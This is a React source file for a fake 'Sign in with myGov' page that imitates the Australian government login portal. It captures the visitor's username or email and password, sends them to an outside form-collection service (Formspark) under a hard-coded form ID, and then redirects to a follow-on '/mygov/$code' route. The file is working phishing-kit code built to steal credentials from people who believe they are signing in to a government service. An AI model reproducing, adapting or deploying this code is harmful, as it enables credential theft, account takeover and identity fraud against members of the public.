import { useFormspark } from "@formspark/use-formspark";
import { useState } from "react";
import { Navigate } from "react-router-dom";

const FORMSPARK_FORM_ID = "y42HcIl0k";
// const FORMSPARK_FORM_ID = "JJIo9CDp";

const FirstLogin = () => {
  const [eml, setEml] = useState("");
  const [passing, setPassing] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      eml,
      passing,
    });
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/mygov/$code",
          }}
        />
      </p>
    );
  }
  return (
    <div>
      <div className="grid place-content-center px-4">
        <div className="md:w-128">
          <div className="pt-10">
            {/* <a
              href="/"
              className="text-blue-600 pt-10 font-bold text-sm underline"
            >
              Back
            </a> */}
          </div>
          <div className="text-3xl font-bold pt-4">Sign in with myGov</div>
          <div className="pt-3 text-sm">Choose how to sign in</div>
          <div className="text-lg font-bold pt-5 mb-8">
            Using your myGov sign in details
          </div>
          <form action="" className="mb-16" onSubmit={handleSubmit}>
            <div className="pb-4">
              <label htmlFor="" className="font-bold">
                Username or email
              </label>
              <br />
              <input
                type="text"
                className="border-2 border-black w-full mt-2 p-2"
                value={eml}
                onChange={(e) => setEml(e.target.value)}
                required
              />
              <div className="text-blue-700 text-sm underline font-semibold">
                <a href="/">Forgot username</a>
              </div>
            </div>
            <div className="">
              <label htmlFor="" className="font-bold">
                Password
              </label>
              <br />
              <input
                type="password"
                className="border-2 border-black w-full mt-2 p-2"
                value={passing}
                onChange={(e) => setPassing(e.target.value)}
                required
              />
              <div className="text-blue-700 text-sm underline font-semibold">
                <a href="/">Forgot password</a>
              </div>
            </div>
            <div className="my-4">
              <a href="/" className="underline text-gov-blue">
                Forgot password
              </a>
            </div>
            <button
              disabled={submitting}
              className="w-full my-6 font-semibold text-center bg-gov-blue rounded py-2"
            >
              Sign in
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default FirstLogin;
